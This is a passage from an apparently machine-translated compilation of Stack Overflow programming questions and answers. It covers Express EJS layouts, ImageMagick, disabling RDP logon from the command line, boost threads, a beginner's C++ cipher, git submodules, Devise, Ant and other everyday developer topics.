    app.use("/public", express.static(__dirname + '/public'));
});

app.get('/', function (req, res) {
    res.render('index');
}); 
```

我在 /views 文件夹中有一个 index.ejs 和 layout.ejs：

布局.ejs：

```
<!doctype html>
<html lang="en" manifest=""><head>
    <title>jQuery Plugin Demo</title>
</head>
<body>
    <div class="container container-fluid">
        <%- body %>
    </div>
</body>
</html> 
```

索引.ejs：

```
Hello world 
```

index.ejs 仅呈现“Hello world”文本，而没有周围的 layout.ejs 包装器。ejs 正在工作。它能够找到正确的 .ejs 模板，但它只是忽略了布局。我也尝试过将布局文件显式添加到应用程序..

```
app.set('view options', { layout:'layout.ejs' }); 
```

所有这些在本地都可以正常工作，但在 Heroku 上却不行。这是我的 package.json：

```
{
  "name": "in1-test",
  "version": "0.0.1",
  "author": "Iatek",
  "dependencies": {
    "express": ">=2.5.x",
    "ejs": ">=0.7.x"
  },
  "engines": {
    "node": "0.6.x"
  }
} 
```

为什么布局上没有乐趣？？？谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-23T06:53:48.793

我将 express 3.x 与 ejs-locals 一起使用，效果很好。您只需指定要使用的布局：

登录.ejs

```
<% layout('layout') -%>
<form>...</form> 
```

布局.ejs

```
<body>
<h1>Hello</h1>
<%- body %>
</body> 
```

[https://npmjs.org/package/ejs-locals](https://npmjs.org/package/ejs-locals)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-01T01:06:31.110

当您部署到 Heroku 时，它会为您的所有依赖项执行 npm 安装；因为您已声明 express >=2.5.x，它将安装最新的 3.0.0_betax。Express 3 不支持 ejs 中的布局（目前）。

要修复删除 ">=" 并指定本地版本中的 express 版本。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-10-15T18:57:29.740

正如 chovy 所说，如果您想升级到 Express 3.x，ejs-locals 可以帮助您处理这个问题。我在这里有一个 github 存储库，它为 Express 3.x、ejs 和 twitter 引导程序提供了一个引导项目：

[https://github.com/cacois/node-express-twitter-bootstrap](https://github.com/cacois/node-express-twitter-bootstrap)

它是新应用程序的一个很好的起点，或者作为如何在 Express 3.x 中使用 ejs 布局的示例。

# android - Android 在 UI 线程上使用光标

> ID：11751121
> 
> 赞同：3
> 
> 时间：2012-08-01T00:50:28.437
> 
> 标签：android, android-sqlite, android-contentprovider, android-cursorloader

我想知道何时或是否可以使用游标从 ui 线程上的 sqlite 数据库获取数据。基本上我使用游标加载器来获取游标。然后我想用那个光标做点什么。可以用主 ui 线程中的光标做某事吗？真的，我只需要从光标中读取一行。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T00:55:32.647

从 a`Cursor`中检索一行并不是一项昂贵的操作……另一方面，从数据库中查询数据可能会很耗时，具体取决于您请求的数据量和/或查询的复杂性。`CursorLoader`s 异步查询`Cursor`s 所以你的方法很好。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-08-01T00:52:08.547

没关系。这不是网络操作。

编辑：“没关系”我的意思是 Android 4.x 不会强制关闭您的应用程序，就像在主线程上执行网络 I/O 一样。根据查询时间，暂停 UI 线程可能合适，也可能不合适。对于“通过其主键从单个表中获取单行”类型的查询，它非常好。对于需要一秒钟或更长时间的复杂查询，请考虑使用后台线程和进度对话框。

# imagemagick - ImageMagick 中的这个“fx”表达式有什么问题？

> ID：11751126
> 
> 赞同：1
> 
> 时间：2012-08-01T00:50:46.800
> 
> 标签：imagemagick

我正在尝试使用 ImageMagick 去除一堆图像的背景。ImageMagick 网站记录了执行此操作的[各种技术](http://www.imagemagick.org/Usage/masking/#bg_remove)。他们还方便地编写了一个 shell 脚本[bg_removal.sh](http://www.imagemagick.org/Usage/scripts/bg_removal)，其中包含这些方法的首选组合。

我在脚本中遇到了错误。当你调用脚本时，你会给出几个模糊参数，加上你知道的特定背景颜色。传递明确的背景颜色，例如`RGB(37,188,111)`，会产生最终命令的以下片段：

```
( +clone -sparse-color voronoi 0,0,RGB(37,188,111) ) 
```

..它工作正常。但是，如果您不传递 bgcolor，则表达式如下所示：

```
( +clone -sparse-color voronoi 0,0,%[fx:p{0,0}] ) 
```

它失败并显示有关 . 的参数数量错误的消息`-sparse-color`。我可以将其更改为不同的功能，并且可以正常工作：

```
( +clone -sparse-color voronoi 0,0,%[pixel:p{0,0}] ) 
```

我对 ImageMagick 知之甚少，不知道该`fx`功能在做什么以及是否`pixel`可以替代。我认为它正在寻找坐标 0,0 处的颜色来猜测背景颜色，但不完全确定。语法`0,0,%[fx:p{0,0}]`是否正确？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:13:01.400

`-fx`是一个运算符，可让您使用数学或 IM 特定表达式应用于像素：`-fx 'expression'`.

仅在 ImageMagick 版本 6.2.10 和之后的版本中引入，您可以在[图像属性转义字符串](http://www.imagemagick.org/script/escape.php)中使用类似 '%[fx:...]' 的转义*序列，用于将**它们括在大括号中*的特殊情况。所以这两种方法都应该在 v6.2.10 之后工作：

 *```
%[fx:expression]
%[pixel:expression] 
```

至于您的问题：是的，*“像素**是**可以接受的替代品”*。

表达式的`p{0,0}`意思是：*'返回当前图像左上角像素的颜色值'*。

所以检查你的 ImageMagick 版本：

```
 convert -version 
```

至于为什么由于*“参数数量错误”*而导致完整表达式对您失败`-sparse-color`：

1.  检查是否`voronoi`是支持的方法之一`-sparse-color`：

    `convert -list sparse-color`

    （我认为它是 - 否则您可能会看到不同的错误消息。）

2.  的一般语法`-sparse-color`记录为：

    `-sparse-color method 'x,y color ...'`

    这表明您可能应该使用额外的引号来制作稀疏颜色以识别正确数量的参数。怎么样

    `( +clone -sparse-color voronoi '0,0 %[fx:p{0,0}]' )`

    ??

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-03-24T04:36:40.323

我遇到了一个问题，尽管使用了 v7+，我的 fx 表达式也不起作用。我将命令从更改`convert`为`magick`，然后它开始工作。希望这可以帮助其他人免于将头撞到墙上。*

# windows - 如何从命令行拒绝通过终端服务 (RDP) 登录？

> ID：11751137
> 
> 赞同：1
> 
> 时间：2012-08-01T00:53:31.190
> 
> 标签：windows, command-line, windows-server-2003, remote-desktop, administration

在 Windows 2003 中，我可以开始...
**控制面板 -> 管理工具 -> 本地安全策略**
然后，如果我去...
**本地策略 -> 用户权限分配 -> 拒绝通过终端服务登录**
... 它让我拒绝 RDP 访问某个用户帐户（即使该帐户是管理员）。

我怎样才能从命令行做同样的事情，所以我可以自动化它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-10T00:36:19.087

您应该能够使用该`reg`命令来修改与此组策略设置对应的注册表项。

要禁用，请从批处理文件中尝试：

```
reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"
/v fDenyTSConnections
/t REG_DWORD
/d 1
/f 
```

为了便于阅读，我已将开关包装在多行中，请确保将所有这些放在批处理文件中的一行中。我无权访问 Windows 2003 服务器来确认这两个设置是否相同，但我相信它们是相同的。当您更改该 GP 设置时，您可以使用[Process Monitor来观察哪个注册表项发生了变化，以在我有错误键的情况下找出它是哪一个。](http://technet.microsoft.com/en-us/sysinternals/bb896645)

看来您也可以使用[NTrights 实用程序](http://support.microsoft.com/kb/315276)和`SeDenyRemoteInteractiveLogonRight`权利来更改此设置。其语法为：

```
NTRights.exe -u user +r SeDenyRemoteInteractiveLogonRight 
```

# facebook - Facebook 无效的重定向 URI

> ID：11751139
> 
> 赞同：2
> 
> 时间：2012-08-01T00:54:00.183
> 
> 标签：facebook, facebook-graph-api

我正在尝试在我的本地机器上开发。我已将 facebook 站点 URL 设置为

```
http://localhost:8000 
```

我的登录代码：

```
function tryFBLogin() {
   FB.login(function(response) {
   if (response.authResponse) {
            console.log("User is connected to the application.");
            var accessToken = response.authResponse.accessToken;
            return  http.HttpResponseRedirect(reverse('http://localhost:8000/page/'))
        } else {
            console.log("Something messed up in facebook login");
        }
    });
} 
```

当我单击登录按钮时，我收到此错误消息：

```
API Error Code: 191
API Error Description: The specified URL is not owned by the application
Error Message: Invalid redirect_uri: Given URL is not allowed by the Application configuration. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:17:23.943

重定向参数必须与应用程序的域匹配。

将应用程序域设置为空白，并将站点 url 设置为您正在显示的链接的根目录。

```
App Domain: 
Site URL: http://localhost:8000 
```

# c++ - 等待从获取锁的函数调用的辅助函数中的条件变量

> ID：11751140
> 
> 赞同：1
> 
> 时间：2012-08-01T00:54:04.363
> 
> 标签：c++, boost, boost-thread

我是 boost 线程库的新手。我有一种情况，我在一个函数中获得了一个 scoped_lock 并且需要在被调用者中等待它。

代码位于以下行：

```
class HavingMutex
{
   public:
   ...
   private:
   static boost::mutex m;
   static boost::condition_variable *c;
   static void a();
   static void b();
   static void d();
}

void HavingMutex::a()
{
   boost::mutex::scoped_lock lock(m);
   ...
   b()          //Need to pass lock here. Dunno how !
}

void HavingMutex::b(lock)
{
    if (some condition)
    d(lock) // Need to pass lock here. How ?
}

void HavingMutex::d(//Need to get lock here)
{
    c->wait(lock); //Need to pass lock here (doesn't allow direct passing of mutex m)
} 
```

基本上，在函数 d() 中，我需要访问我在 a() 中获得的作用域锁，以便我可以等待它。（其他一些线程会通知）。

任何帮助表示赞赏。谢谢 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T07:33:30.040

您是否尝试过简单的参考？根据[http://www.boost.org/doc/libs/1_41_0/doc/html/thread/synchronization.html](http://www.boost.org/doc/libs/1_41_0/doc/html/thread/synchronization.html)上的 boost 1.41 文档，这应该是所需要的。...

```
 void HavingMutex::a()
     {
        boost::mutex::scoped_lock lock(m);
        ...
        b(lock);
     }

     void HavingMutex::b(boost::mutex::scoped_lock &lock)
     {
         if (some condition) // consider while (!some_condition) here
           d(lock); 
     }

     void HavingMutex::d(boost::mutex::scoped_lock &lock)
     {
         c->wait(lock);
     }

     void HavingMutex::notify()
     {
         // set_condition;
         c->notify_one();
     } 
```

同样在 boost 示例中，他们有 while 循环等待。在某些情况下，等待可能会被系统本身中断，而不是你真的得到了锁。

我建议您重新考虑将所有方法都设置为静态成员。而是将它们创建为普通成员，并创建一个全局对象。

# c++ - 从文件c ++中将单个字符读入变量

> ID：11751141
> 
> 赞同：0
> 
> 时间：2012-08-01T00:54:04.903
> 
> 标签：c++, file, input, io

我在搞乱文件输入/输出，我正在尝试制作一个编码/解码程序。我需要帮助将文件中的编码字符读回要解码的程序。（这不是一个作业，因为我明年才上 9 年级，我正在尝试这样做，因为它看起来很有挑战性。）这是我的代码：

```
#include <iostream>
#include <fstream>
#include <string>
#include <cstdio>
#include <cstdlib>
/* 
 * OUT: categorize words into char's, assign a symbol/number to each char, output number 
 *      combonation to file.
    IN: load file, decode file, read decoded version. */ 

using namespace std;

void Encode(){
        char message[100];
    char ENCODED[100];
    cout<<"input new content:\n>";
    cin.getline(message, 99);
    cin.ignore();
    cout<<"encoding...\n";
    for (int i=0; i<100; ++i){
             if (message[i]=='a') ENCODED[i]='1';
        else if (message[i]=='b') ENCODED[i]='$';
        else if (message[i]=='c') ENCODED[i]='!';
        else if (message[i]=='d') ENCODED[i]='*';
        else if (message[i]=='e') ENCODED[i]='2';
        else if (message[i]=='f') ENCODED[i]='&';
        else if (message[i]=='g') ENCODED[i]='^';
        else if (message[i]=='h') ENCODED[i]='%';
        else if (message[i]=='i') ENCODED[i]='3';
        else if (message[i]=='j') ENCODED[i]='=';
        else if (message[i]=='k') ENCODED[i]='_';
        else if (message[i]=='l') ENCODED[i]='-';
        else if (message[i]=='m') ENCODED[i]='2';
        else if (message[i]=='n') ENCODED[i]='9';
        else if (message[i]=='o') ENCODED[i]='4';
        else if (message[i]=='p') ENCODED[i]='|';
        else if (message[i]=='q') ENCODED[i]='/';
        else if (message[i]=='r') ENCODED[i]='>';
        else if (message[i]=='s') ENCODED[i]='?';
        else if (message[i]=='t') ENCODED[i]='}';
        else if (message[i]=='u') ENCODED[i]='5';
        else if (message[i]=='v') ENCODED[i]=',';
        else if (message[i]=='w') ENCODED[i]='.';
        else if (message[i]=='x') ENCODED[i]=';';
        else if (message[i]=='y') ENCODED[i]=')';
        else if (message[i]=='z') ENCODED[i]='@';
        else if (message[i]==' ') ENCODED[i]='#';
                else if (message[i] =='\0') {ENCODED[i] = '\}'; break;}
        else ENCODED[i]=' ';
    }
    cout<<"done encoding.\n";
    cout<<"exporting file...\n";
    ofstream OUTfile ("encoded.txt");
    OUTfile<<ENCODED;
    cout<<"file exported to parent directory.\n"; 
    cin.get();
}

void Decode(){ //this is where I run into problems!!
        string encoded[100]
    char DECODED[100]
    ifstream INfile ("encoded.txt");
    cout<<"Decoding...\n";
    INfile>>encoded;
    for (i=0; i<100; ++i){
             if (encoded[i]=='1') DECODED[i]='a';
        else if (encoded[i]=='$') DECODED[i]='b';
        else if (encoded[i]=='!') DECODED[i]='c';
        else if (encoded[i]=='*') DECODED[i]='d';
        else if (encoded[i]=='2') DECODED[i]='e';
        else if (encoded[i]=='&') DECODED[i]='f';
        else if (encoded[i]=='^') DECODED[i]='g';
        else if (encoded[i]=='%') DECODED[i]='h';
        else if (encoded[i]=='3') DECODED[i]='i';
        else if (encoded[i]=='=') DECODED[i]='j';
        else if (encoded[i]=='_') DECODED[i]='k';
        else if (encoded[i]=='-') DECODED[i]='l';
        else if (encoded[i]=='2') DECODED[i]='m';
        else if (encoded[i]=='9') DECODED[i]='n';
        else if (encoded[i]=='4') DECODED[i]='o';
        else if (encoded[i]=='|') DECODED[i]='p';
        else if (encoded[i]=='/') DECODED[i]='q';
        else if (encoded[i]=='>') DECODED[i]='r';
        else if (encoded[i]=='?') DECODED[i]='s';
        else if (encoded[i]=='}') DECODED[i]='t';
        else if (encoded[i]=='5') DECODED[i]='u';
        else if (encoded[i]==',') DECODED[i]='v';
        else if (encoded[i]=='.') DECODED[i]='w';
        else if (encoded[i]==';') DECODED[i]='x';
        else if (encoded[i]==')') DECODED[i]='y';
        else if (encoded[i]=='@') DECODED[i]='z';
        else if (encoded[i]=='#') DECODED[i]=' ';
                else if (encoded[i] =='\0') {DECODED[i] = '\}'; break;}
        else DECODED[i]==' ';
    } 
    cout<<"Decoded file content: "<<DECODED;
    cin.get();
}

int main(){
    string choice;
    cout<<"Encode new message or decode previous file?\n> ";
    cin>>choice;
    cin.ignore();
    if (choice=="encode") Encode();
    if (choice=="decode") Decode();
    return 0;
} 
```

如您所见，当涉及到解码功能时，我不知道自己在做什么。任何帮助，将不胜感激！谢谢！

**编辑：**我用提供的建议更新了代码，但是当编译器到达“INfile>>encoded;”行时 它说“INfile>>encoded”中的运算符“>>”不匹配......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:15:04.003

我相信这里的问题是您不了解 char 和 string 之间的区别。char 是一个字母或符号，例如 'a' 'b' 'c' '1' '0' '^' ( 等等。但是一个字符串 - 它是一个字符序列，例如 "abc" "123" "* &^" 等。在 C/C++ 中，我们使用单引号来指定字符，如 'a'。单引号内的值只能包含一个字母。要指定字符串，我们使用双引号，如前所述。A双引号内的值可以包含任意数量的字符。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T01:51:11.910

问题：

编译失败 (g++-4.5.1) 没有`ifstream`找到合适的构造函数重载，需要`name.c_str()`.

```
ifstream INfile (name); 
```

接下来的两个声明中缺少分号

```
char encoded[100]
char DECODED[100] 
```

循环计数器`i`未声明 ( `for(int i = 0; ...`)

```
for (i=0; i<100; ++i){
         if (encoded[i]=='1') DECODED[i]='a'; 
```

从这里开始，您将`DECODED[i]`与字符常量进行比较，而不是分配它们。将所有这些替换`DECODED[i]==`为`DECODED[i] =`.

```
 else if (encoded[i]=='$') DECODED[i]=='b';
    else if (encoded[i]=='!') DECODED[i]=='c';
    else if (encoded[i]=='*') DECODED[i]=='d'; 
```

另一个问题是您编码和解码 100 个字符，无论实际消息是否更短。在`Decode()`和`Encode()`中，添加对字符串结尾的检查

```
if (array[i] =='\0') {
    other_array[i] = '\}';
    break;
} 
```

结束转换。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T01:48:22.040

由于这是您自己的练习，我建议您创建一个映射来避免那些疯狂的 if 语句（并让以后更容易修改您的编码）：

```
// Warning: always address these with ints or unsigned char, not char
// if you expect extended ASCII characters
static unsigned char encode_map[256] = {0};
static unsigned char decode_map[256] = {0};

void InitEncodingMap()
{
    encode_map['a'] = '1';
    encode_map['b'] = '$';
    encode_map['c'] = '!';
    encode_map['d'] = '1';
    // etc...
    encode_map['z'] = '@';
    encode_map[' '] = '#';

    // Create the reverse map
    for( int i = 0; i < 256; i++ ) {
        unsigned char encoded = encode_map[i];
        if( decode_map[encoded] != 0 ) {
            printf("Collision for mapping %c -> %c\n", (char)i, encoded );
        } else {
            decode_map[encode_map[i]] = (unsigned char)i;
        }
    }
} 
```

现在，尝试重写您的 Encode 和 Decode 函数以使用这些映射。

# android - 解密内容提供者中的数据

> ID：11751144
> 
> 赞同：1
> 
> 时间：2012-08-01T00:54:37.603
> 
> 标签：android, security, encryption, android-contentprovider

我有一个实现`openFile()`返回大数据 BLOB 的内容提供程序。这些是 SD 卡上的加密文件。我（显然）需要在离开内容提供者的路上解密数据，以便消费者可以使用它。

问题是`openFile()`返回 a `ParcelFileDescriptor`，这让我没有机会在出路时解密数据。有什么解决办法吗？

这当然引出了一个问题……如果我通过内容提供商打开数据，那么加密它的意义何在？我想我的回答是，将未加密的数据放在 SD 卡上比通过内容提供商公开数据要差一些。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-18T18:36:00.223

没有明显的方法可以解决这个问题。我最终创建了一个临时文件，该文件在一段时间后被删除。

我的第一次尝试是使用 Unix 在打开文件后删除文件的技巧，导致文件在被阅读器关​​闭后立即被删除。事实证明，许多应用程序会从内容提供程序读取和重新读取数据以进行单个逻辑打开。例如，图库应用程序似乎首先以低分辨率读取数据，以便快速显示，然后再次读取以全分辨率显示。

# git - 如何在 GitHub 上管理具有未存储在 GitHub 上的外部 git 依赖项的项目

> ID：11751152
> 
> 赞同：4
> 
> 时间：2012-08-01T00:55:22.283
> 
> 标签：git, github, git-submodules, mupdf

我正在做一个我想存储在 GitHub 上的项目。

本项目使用 mupdf，它托管在自己的 git 服务器上，例如 git://git.ghostscript.com/mupdf.git

我希望能够从 mupdf 获取最新更改，同时保留我对 mupdf 所做的更改，同时将我的整个项目保留在 GitHub 上。

我的第一个想法是将 mupdf 添加为子模块，然后将我的项目推送到 GitHub——但是我对 mupdf 所做的更改（例如在子模块内）会发生什么？我在哪里存储这些？我的理解是，如果我在子模块内进行更改，那里的提交只会存储在本地。我阅读了此页面[http://git-scm.com/book/en/Git-Tools-Submodules](http://git-scm.com/book/en/Git-Tools-Submodules)，但不确定这是否可行。

设置我的仓库的最佳方法是什么，例如：

1) 我的整个项目都在 GitHub 上 2) 我可以将 mupdf 的新更改添加到我的项目中 3) 我可以保留对 mupdf 的更改并将它们与新更改合并

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:06:59.717

您要么必须将更改推送到另一个 git 存储库（无论它可能存储在哪里），要么在 GitHub 上创建该存储库的分支并在那里进行更改。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T03:11:43.383

您也可以将子模块的 repo 推送到 github。如果您希望将其作为存储库所在的默认位置，`.gitmodules`请在工作文件夹根目录中的文件中进行调整。然后发出

```
git submodule init 
```

将新的 url 传播到`.git/config`子模块中。

# python - 为什么 `not(foo)` 不会引发 SyntaxError？

> ID：11751155
> 
> 赞同：-1
> 
> 时间：2012-08-01T00:56:42.457
> 
> 标签：python, syntax

在 Python 中，布尔运算符是[`and, or not`](http://docs.python.org/py3k/library/stdtypes.html#boolean-operations-and-or-not)

我在文档中没有找到可以将运算符用作语句或函数的任何地方；但这不会引发任何错误？

```
>>> not(1)
False 
```

但这确实

```
>>> and(1)
SyntaxError: Invalid Syntax 
```

有什么我遗漏的东西`()`可以让它起作用吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-01T01:00:29.537

这与它的工作原理相同：

```
not (True and False) 
```

即，括号充当分组运算符，*而不是*指示函数调用。在表达式合法的任何地方，括号也是合法的，用于将一个完整的表达式显式组合在一起，可用于覆盖其他运算符的优先级（如`(x + y) * z`，与`x + y * z`- 后者等效于`x + (y * z)`） .

`and`需要两个参数，这就是`and(1)`语法错误的原因——您只指定了一个参数。 `(x) and (y)`，但是，*是*合法的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-01T01:02:08.690

你得到 SyntaxError 是`and`因为它是一个二元运算符，而不是因为括号：

```
(1) and(1) 
```

是合法的 Python 语法。

# java - 玩！2 框架——添加Java Mongo驱动

> ID：11751162
> 
> 赞同：2
> 
> 时间：2012-08-01T00:57:27.783
> 
> 标签：java, mongodb, playframework, dependencies, mongo-java

我正在尝试将 java mongo 驱动程序与 Play! 一起使用。

所以我读了：

[http://www.playframework.org/documentation/2.0.2/SBTDependencies](http://www.playframework.org/documentation/2.0.2/SBTDependencies)

[http://www.mongodb.org/display/DOCS/Java+Tutorial](http://www.mongodb.org/display/DOCS/Java+Tutorial)

我在eclipse中添加了构建路径。但是play找不到依赖。

所以playframework主页上有一个例子，但我还是想不通。

```
val appDependencies = Seq(

      "org.scala-tools" %% "scala-stm" % "0.3",
      "org.apache.derby" % "derby" % "10.4.1.3" % "test"

    ) 
```

为什么是 der 2% 的符号？如何获得正确的名称？我只知道版本应该是2.8.0。那么如果我想添加Java驱动，我该怎么做呢？

如果我使用官方的 java 驱动程序，我不必使用 Morphia 对吗？

[安装播放框架 mongodb morphia 模块](https://stackoverflow.com/questions/10911698/installing-play-framework-mongodb-morphia-module)

.

.

编辑：

```
import sbt._
import Keys._
import PlayProject._

object ApplicationBuild extends Build {

    val appName         = "website"
    val appVersion      = "1.0-SNAPSHOT"

    val appDependencies = Seq(
        "org.mongodb" % "mongo-java-driver" % "2.8.0"
        //"com.mongodb" % "Mongo" %"2.8.0"

    )

    val main = PlayProject(appName, appVersion, appDependencies, mainLang = JAVA).settings(
      // Add your own project settings here      
    )

} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-01T07:20:59.883

要将 MongoDB 驱动程序添加到您的 Play 项目，请编辑您的`project/Build.scala`文件以添加 MongoDB 依赖项：

```
val appDependencies = Seq(

   // ... here are your previous dependencies (derby etc...)
   "org.mongodb" % "mongo-java-driver" % "2.8.0"

) 
```

添加后，您需要重新启动 Play 服务器以使更改生效。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-11-11T21:49:12.703

我在我的项目中使用了响应式 mongo。你可以在这里找到一些信息 [http://reactivemongo.org/releases/0.10.5/documentation/tutorial/setup.html](http://reactivemongo.org/releases/0.10.5/documentation/tutorial/setup.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-08-22T09:13:30.043

如果接受的答案对你们中的某些人不起作用，您可以尝试在 build.sbt 中添加这个版本的 mongodb

```
"org.mongodb.morphia" % "morphia" % "0.107" 
```

# r - R中的自文档代码？

> ID：11751165
> 
> 赞同：1
> 
> 时间：2012-08-01T00:57:53.373
> 
> 标签：r

R是否有任何**代码自记录系统**？

我认为编写文档是任何统计分析中非常重要的一部分。你的代码中总有一些重要的细节或者数据清洗的步骤没有反映在最终的分析报告中。我想知道 R 中是否有任何有效的自记录系统（或方法）可以帮助我记录我的代码，包括我的注释 o 带有结构文件的代码，解释我的代码中使用的数据集（或表）的结构？

除了在 R 中使用 Sweave 或 knitr 之外，还有其他方法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T01:22:22.410

我建议将您的代码和数据集捆绑在一个 R 包中。第一次做的时候学习曲线很陡峭，但如果你问到“我怎样才能更好地管理这个代码文档”，你可能已经准备好冒险了。

另外，输入`?myOwnFunction`or`?myOwnDataset`并弹出相应的帮助文件（就像您输入 or 时那样`?mean`）`?iris`听起来不是很吸引人吗？

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-01T01:02:05.770

您可以尝试将代码编写为 Sweave 或 kntr 文件，其中包含 LaTeX 文本和 R 代码。此过程会生成您的文本（包括您的代码）的 pdf，并执行您的代码。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-01T01:18:01.710

如果您选择将分析组织为包，则可以`roxygen2`用于代码和数据的文档。

# ruby-on-rails - 在几次失败的试验后，Rails Devise Registrations 重定向用户

> ID：11751166
> 
> 赞同：0
> 
> 时间：2012-08-01T00:57:55.980
> 
> 标签：ruby-on-rails, devise

我有一个设计 registrations_controller，它的 create 方法在几次试验后重定向用户。问题是我对专用注册页面和灯箱注册使用相同的创建方法。灯箱使用 ajax 调用调用 create 方法，并且重定向会造成麻烦。

除了调用 super 之外，我在 create 方法中没有做太多事情。如果对它进行 ajax 调用，我如何告诉设计不要重定向？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:55:41.020

为了防止重定向，您可以构建一个自定义失败应用程序：

```
 class CustomFailureApp < Devise::FailureApp

  def respond    
    unless request.format.to_sym == :html
      http_auth
    else
      redirect_to redirect_url
   end
    end

   def http_auth 
      super     
      self.status         = 401
      self.content_type   = 'json'
      self.response_body  = {
        :error => 'NO MORE REDIRECT',
        :status => 401
      }.to_json
  end
end 
```

配置 Warden 以在设计初始化程序中使用此失败应用程序：

```
 Devise.setup do |config|

  ...

  # ==> Warden configuration
  # If you want to use other strategies, that are not (yet) supported by Devise,
  # you can configure them inside the config.warden block.
  config.warden do |manager|
    manager.failure_app = CustomFailureApp
  end
end 
```

这是一个参考：

[http://casperfabricius.com/site/2010/09/30/ajax-sign-in-and-sign-up-with-devise/](http://casperfabricius.com/site/2010/09/30/ajax-sign-in-and-sign-up-with-devise/)

# c# - c# 中的 c 函数是否有类似 ParameterInfo 类的东西？

> ID：11751174
> 
> 赞同：0
> 
> 时间：2012-08-01T00:59:25.903
> 
> 标签：c#, reflection

我需要`mfc`在运行时加载 C 或库。所以，我`WIN32Api`用于加载库并可以获得函数指针。但我不知道函数调用所需的参数类型，因为`mfc`每个进程都更改了 C 或库。

我该怎么做？

# c# - 单元测试出参数

> ID：11751175
> 
> 赞同：0
> 
> 时间：2012-08-01T00:59:42.690
> 
> 标签：c#, unit-testing

下面是我为测试输出而编写的单元测试代码，Msg 函数不会返回任何结果，而是使用 out 返回一个字符串：

```
 string = "testing"
    string id = string.Empty; 
    string idExpected = "1"
    target.Msg(string, out id)
    Assert.AreEqual(idExpected, id); 
```

我应该把任何东西放入id吗？它是一个输出。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:05:45.477

不，如果它出来了 - 什么都不会进去，它不会有任何区别。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T01:19:01.127

编译器强制带有参数的方法为`out`参数赋值，因此您根本不应该初始化它：

```
var str = "testing";
string id;
target.Msg(str, out id); // Msg will always initialize id. 
```

# ant - ant build 后运行批处理命令

> ID：11751176
> 
> 赞同：2
> 
> 时间：2012-08-01T00:59:49.877
> 
> 标签：ant, command-line, batch-file, callback

我正在尝试创建一个批处理文件来自动化烦人的构建过程。让我失望的关键部分是当命令启动一个接管键盘输入的进程时。

基本上，我按照 ant -f build-rmi.xml rmiregistry 的方式运行一些东西，它构建并运行 rmiregistry。完成此操作后，我需要运行另一个构建，但我无法弄清楚在 ant 构建完成执行后如何启动另一个命令

我没有对任何 ant 文件的写入权限。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T08:52:36.067

1.  创建一个新的 ANT 构建脚本**run-both.xml**
2.  **在run-both.xml**中添加 Import以获取原始脚本。
3.  **在run-both.xml**中创建一个新目标，比如“runbatch”。使用[ANT exec 任务](http://ant.apache.org/manual/Tasks/exec.html)从该目标调用 DOS 命令

> ```
> <project name="run-both" default="runbatch"> 
> <import file="${path_to_rmi}/build-rmi.xml"/> 
> 
> <target name="runbatch" depends="rmiregistry">   
>     <exec executable="cmd">
>        <arg value="/c"/>
>        <arg value="echo hello Matt"/>   
>     </exec>
>  </target>
> </project> 
> ```

在命令提示符下

`ant -f run-both.xml`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-03-28T06:54:00.680

使用命令调用，运行ant命令后批处理脚本文件不会停止

```
 call ant 
```

# javascript - 有什么好的方法可以确定网页的“实际内容宽度”吗？

> ID：11751185
> 
> 赞同：3
> 
> 时间：2012-08-01T01:00:36.180
> 
> 标签：javascript, html, screen-resolution

这是 StackOverflow 在我的（巨大的）工作监视器上的样子：

![StackOverflow 的截图](../Images/1fd4205dc30863950f3c6209d37b4510.png)

这是网站实际内容两侧的**大量空白。**

我知道这就是很大比例的网站的设计方式——所以我没有在这里单挑 SO——但这实际上正是我问这个问题的原因。我想如果我有一些可靠的方法（比如，通过 JavaScript）来确定网站的“实际”宽度，那会非常好，然后我可以用它来编写一个快速脚本，自动扩展我的任何网站我正在浏览以填充我显示器上的可用宽度。事实上，我发现有时在意识到/记得放大以利用我巨大的屏幕之前，我仍然眯着眼睛阅读微小的文本，这很荒谬。

![StackOverflow 的放大截图](../Images/88196265010fbb5df6632678e83f9515.png)

啊……好多了。

我*怀疑*这是可能的，至少通过一些启发式方法在合理程度上是可能的，因为当我在浏览网页时双击屏幕时，我的 Android 手机似乎做了很多类似的事情。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T01:30:02.363

这将做类似的事情。虽然可能会错过各种边缘情况。

```
// Assuming jQuery for simplicity
var drillIn = function(node) {
  var max = 0;
  var windowWidth = $(window).width();
  var result = 0;

  $(node).children().each(function() {
    var $this = $(this);
    if ($this.width() > max) {
      max = $this.width();
    }
  });

  if (0 < max && max < windowWidth) {
    return max;
  } else {
    $(node).children().each(function() {
      var childMax = drillIn(this);
